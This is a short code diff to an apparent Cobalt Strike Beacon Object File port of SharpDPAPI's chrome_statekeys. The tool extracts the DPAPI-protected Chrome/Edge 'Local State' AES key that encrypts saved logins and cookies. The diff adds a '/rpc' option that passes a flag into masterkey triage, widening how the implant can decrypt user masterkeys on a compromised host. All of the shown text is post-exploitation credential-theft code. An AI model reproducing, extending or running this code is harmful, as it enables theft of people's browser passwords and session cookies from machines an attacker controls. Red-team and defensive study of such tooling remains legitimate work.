@@ -3,7 +3,7 @@
  *
  * Usage:
  *   chrome_statekeys [/pvk:BASE64] [/credkey:KEY] [/server:SERVER]
- *                    [/target:PATH] [/unprotect]
+ *                    [/target:PATH] [/unprotect] [/rpc]
  *
  * Extracts the Chrome/Edge "Local State" AES encryption key,
  * which is DPAPI-protected and used to encrypt login/cookie data
@@ -24,6 +24,7 @@ void go(char* args, int args_len) {
     char* server_str = BeaconDataExtract(&parser, NULL);
     char* target_str = BeaconDataExtract(&parser, NULL);
     int   unprotect  = BeaconDataInt(&parser);
+    int   use_rpc    = BeaconDataInt(&parser);
 
     BYTE* pvk = NULL;
     int pvk_len = 0;
@@ -62,9 +63,9 @@ void go(char* args, int args_len) {
         }
     }
 
-    if (pvk) {
+    if (pvk || use_rpc) {
         triage_user_masterkeys(&cache, pvk, pvk_len,
-            NULL, NULL, NULL, FALSE, NULL, server, FALSE, NULL);
+            NULL, NULL, NULL, (BOOL)use_rpc, NULL, server, FALSE, NULL);
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Chrome State Keys (BOF) ===\n");
